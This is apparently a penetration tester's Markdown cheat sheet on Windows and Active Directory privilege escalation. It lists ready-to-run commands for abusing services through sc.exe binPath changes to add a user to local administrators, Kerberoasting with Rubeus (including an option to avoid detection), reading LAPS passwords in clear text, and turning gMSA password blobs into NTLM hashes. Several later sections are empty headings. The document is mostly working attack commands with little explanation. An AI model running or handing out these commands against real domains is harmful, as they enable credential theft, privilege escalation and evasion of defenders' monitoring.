# Privilege Escalation

- [Silver Ticket](#silver-ticket)

## Service running 

### Enumeration

Display all service running (powerhsell)
```
    Get-wmiObject -Class win32_servce | select pathname
```

PowerUp

Get services with unquoted paths and a space in their name
```
    Get-ServiceUnquoted -Verbose
```

Get services where the current user can write to its binary path or change arguments to the binary
```
    Get-ModifiableServiceFile -Verbose
```

Get the services whose configuration current user can modify
```
    Get-ModifiableService -Verbose
```

### Exploitation

Using PowerUp
```
    Invoke-ServiceAbuse -Name <service> -Username <domain>\<username> -Verbose
```

Using AccessChk
```
    accesschk64.exe -uwcqv '<user>' *
    sc.exe config <service> binPath= "net localgroup administrators <domain>\<username> /add"
    sc.exe stop <service>
    sc.exe start <service>
```

## Kerberos

### Enumeration

Find user accounts used as Service accounts using AD-Module
```
    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Find user accounts used as Service accounts using Powerview
```
    Get-DomainUser –SPN
```

Use Rubeus to list Kerberoast stats
```
    Rubeus.exe kerberoast /stats
```

To avoid detections based on Encryption Downgrade
```
    Rubeus.exe kerberoast /stats /rc4opsec
```

### Exploitation

Use Rubeus to request a TGS
```
    Rubeus.exe kerberoast /user:<serviceaccount> /simple
    Rubeus.exe kerberoast /user:<serviceaccount> /simple /rc4opsec
```

Kerberoast all possible accounts
```
    Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

## LAPS

### Enumeration

To find users who can read the passwords in clear text machines in OUs using powerview
```
    Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName$_.SecurityIdentifier);$_}
```

To enumerate OUs where LAPS is in use along with users who can read the passwords in clear text using AD-Module
```
    See Get-LapsPermissions.ps1
```

To enumerate OUs where LAPS is in use along with users who can read the passwords in clear text using LAPS module
```
    Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
    Find-AdmPwdExtendedRights -Identity OUDistinguishedName
```

### Exploitation

Using powerview 
```
    Get-DomainObject -Identity <target> | select -ExpandProperty ms-mcs-admpwd
```

Using Active Directory module :
```
	Get-ADComputer -Identity <targetmachine> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
```

Using LAPS module :
```
	Get-AdmPwdPassword -ComputerName <targetmachine>
```

## gMSA

### Enumeration

Using ADModule :
```
	Get-ADServiceAccount -Filter *
```
	
Using PowerView :
```
	Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
```	
Read it using ADModule:
```
	Get-ADServiceAccount -Identity <user> -Properties * | select PrincipalsAllowedToRetrieveManagedPassword	
```

Enumerate the Principals that can read the password blob:
```
	Get-ADServiceAccount -Identity <user> -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

### Exploitation

Use ADModule to read and DSInternals to compute NTLM hash
```
    $Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
    . .\DSInternals.psd1
    $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
    ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
```
## Deleguation

### Unconstrained Delegation

#### Enumeration 

Using Powerview
```
Get-DomainComputer -UnConstrained
```

ActiveDirectory module
```
	Get-ADComputer -Filter {TrustedForDelegation -eq $True}
	Get-ADUser -Filter {TrustedForDelegation -eq $True}
```



### Constrained Delegation

### Resource-based Constrained Delegation

### Constrained Delegation - Kerberos Only

### Constrained Delegation with Protocol Transition

## DLL Hijacking


## Group Membership